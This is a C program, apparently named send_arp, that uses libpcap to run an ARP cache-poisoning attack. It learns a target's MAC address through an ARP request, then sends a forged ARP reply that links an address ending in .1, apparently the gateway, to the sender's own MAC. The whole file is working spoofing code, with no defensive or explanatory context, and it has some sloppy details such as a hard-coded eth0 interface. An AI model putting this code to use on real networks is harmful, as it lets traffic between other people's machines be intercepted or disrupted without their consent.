#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include "send_arp.h"

unsigned char cMacAddr[8];

unsigned char arp_packet[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                          0xff, 0xff, 0xff, 0xff, 0x08, 0x06, 0x00, 0x01,
                          0x08, 0x00, 0x06, 0x04, 0x00, 0x01, 0xff, 0xff,
                          0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
                          0xff, 0xff};


static int GetSvrMacAddress( char *pIface )
{
    int nSD; // Socket descriptor
    struct ifreq sIfReq; // Interface request
    struct if_nameindex *pIfList; // Ptr to interface name index
    struct if_nameindex *pListSave; // Ptr to interface name index

    //
    // Initialize this function
    //
    pIfList = (struct if_nameindex *)NULL;
    pListSave = (struct if_nameindex *)NULL;
#ifndef SIOCGIFADDR
    // The kernel does not support the required ioctls
    return( 0 );
#endif

    //
    // Create a socket that we can use for all of our ioctls
    //
    nSD = socket( PF_INET, SOCK_STREAM, 0 );
    if ( nSD < 0 )
    {
        // Socket creation failed, this is a fatal error
        printf( "File %s: line %d: Socket failed\n", __FILE__, __LINE__ );
        return( 0 );
    }

    //
    // Obtain a list of dynamically allocated structures
    //
    pIfList = pListSave = if_nameindex();

    //
    // Walk thru the array returned and query for each interface's
    // address
    //
    for ( pIfList; *(char *)pIfList != 0; pIfList++ )
    {
        //
        // Determine if we are processing the interface that we
        // are interested in
        //
        if ( strcmp(pIfList->if_name, pIface) )
            // Nope, check the next one in the list
            continue;
        strncpy( sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE );

        //
        // Get the MAC address for this interface
        //
        if ( ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0 )
        {
            // We failed to get the MAC address for the interface
            printf( "File %s: line %d: Ioctl failed\n", __FILE__, __LINE__ );
            return( 0 );
        }
        memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6 );
        break;
    }

    //
    // Clean up things and return
    //
    if_freenameindex( pListSave );
    return( 1 );
}

int main(int argc, char * argv[]){
    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    bzero( (void *)&cMacAddr[0], sizeof(cMacAddr) );
    if ( !GetSvrMacAddress("eth0") )
    {
        // We failed to get the local host's MAC address
        printf( "Fatal error: Failed to get local host's MAC address\n" );
    }
    uint32_t s_ip = ntohl(inet_addr(argv[2]));
    arp_packet[28] = (s_ip&0xff000000)>>24;
    arp_packet[29] = (s_ip&0x00ff0000)>>16;
    arp_packet[30] = (s_ip&0x0000ff00)>>8;
    arp_packet[31] = (s_ip&0x000000ff);
    uint32_t d_ip = ntohl(inet_addr(argv[3]));
    arp_packet[38] = (d_ip&0xff000000)>>24;
    arp_packet[39] = (d_ip&0x00ff0000)>>16;
    arp_packet[40] = (d_ip&0x0000ff00)>>8;
    arp_packet[41] = (d_ip&0x000000ff);
    for(int i=0; i<6; i++){
        arp_packet[6+i] = cMacAddr[i];
        arp_packet[22+i] = cMacAddr[i];
    }

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    pcap_sendpacket(handle, arp_packet, 42);
    while (true){
        struct pcap_pkthdr* header;
        const unsigned char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        struct eth_header *eth = (struct eth_header *)packet;
        struct arp_header *arp = (struct arp_header *)(packet+14);

        if (res == 0) continue;
        if (ntohs(eth->eth_type) == 0x0806 && ntohs(arp->opcode) == 0x0002){
            for(int i=0; i<6; i++){
                arp_packet[i] = eth->smac[i];
                arp_packet[32+i] = eth->smac[i];
            }
            break;
        }
    }
    arp_packet[21] = 0x02;
    arp_packet[31] = 0x01;
    pcap_sendpacket(handle, arp_packet, 42);
    pcap_close(handle);
    return 0;
}
